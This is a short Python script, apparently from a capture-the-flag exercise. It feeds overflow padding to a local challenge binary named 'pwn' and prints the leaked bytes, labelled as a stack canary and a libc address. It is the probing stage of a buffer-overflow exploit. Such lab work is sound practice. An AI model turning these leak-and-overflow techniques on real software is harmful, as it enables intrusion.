import subprocess, time
BIN = ["./ld-linux-x86-64.so.2", "--library-path", ".", "./pwn"]
def run(size, payload, wait=1.0):
    p = subprocess.Popen(BIN, cwd="/run1", stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.stdin.write(str(size).encode() + b"\n"); p.stdin.flush()
    time.sleep(0.15)
    p.stdin.write(payload); p.stdin.flush()
    time.sleep(wait)
    try: p.stdin.close()
    except Exception: pass
    out = p.stdout.read()
    p.wait()
    return out, p.returncode
def extract(out):
    k = b"Your name is: "
    i = out.find(k)
    return None if i < 0 else out[i+len(k):]
for i in range(3):
    out, rc = run(0x59, b"A"*0x59)
    l = extract(out)
    print("canary-mode run", i, "rc", rc)
    if l: print("   leak:", l[0x59:].hex())
for i in range(3):
    out, rc = run(0x68, b"A"*0x58 + b"BBBBBBBB" + b"CCCCCCCC")
    l = extract(out)
    print("libc-mode run", i, "rc", rc)
    if l: print("   leak:", l[0x68:].hex())
